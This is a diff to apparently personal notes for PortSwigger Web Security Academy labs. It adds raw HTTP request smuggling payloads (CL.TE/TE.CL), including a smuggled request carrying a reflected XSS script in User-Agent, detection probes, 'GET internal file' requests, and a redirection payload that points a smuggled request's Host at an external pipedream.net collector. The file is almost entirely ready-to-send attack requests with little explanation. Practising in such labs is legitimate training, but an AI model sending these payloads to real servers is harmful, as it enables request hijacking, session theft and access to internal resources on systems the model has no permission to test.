@@ -13,12 +13,56 @@ Transfer-Encoding: chunked
 G
 
 ==================
+//// xxs Reflected
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+
+
+
+//// CHecker
+
+Transfer-Encoding: chunked
+Content-Length: 12
+
+0
+
+SMUGGLED
+
+//// detection
+
+Transfer-Encoding: chunked
+Content-Length: 12
+
+0
+
+GET /404 HTTP/1.1
+x: x GET /404 HTTP/1.1
+
+//// redirection payload just for HTTP/2
+
+Transfer-Encoding: chunked
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: eorgzd5wuwp3i46.m.pipedream.net/?lee101
+Content-Length: 5
+
+x=1
+
+
+==================
 
 //change target GET request to POST
 
-POST / HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-length: 4
 Transfer-Encoding: chunked
@@ -35,9 +79,6 @@ x=1
 
 //change target GET request to POST
 
-POST / HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-length: 4
 Transfer-Encoding: chunked
@@ -56,10 +97,8 @@ x=1
 STARTMAIN
 
 
-//change target GET request to POST
+//// Detection
 
-POST / HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 35
 Transfer-Encoding: chunked
@@ -71,7 +110,7 @@ X-Ignore: X
 
 =================
 
-//change target GET request to POST || to retrive differnt pageses
+//// Detection
 
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
@@ -89,6 +128,8 @@ x=1
 
 
 =================
+//// GET internal file
+
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 127
 Transfer-Encoding: chunked
@@ -106,7 +147,7 @@ search=test1
 ENDMAIN
 ================================
 
-//change target GET request to POST || manipulate request
+//// GET internal file
 
 POST / HTTP/1.1
 Host: .web-security-academy.net
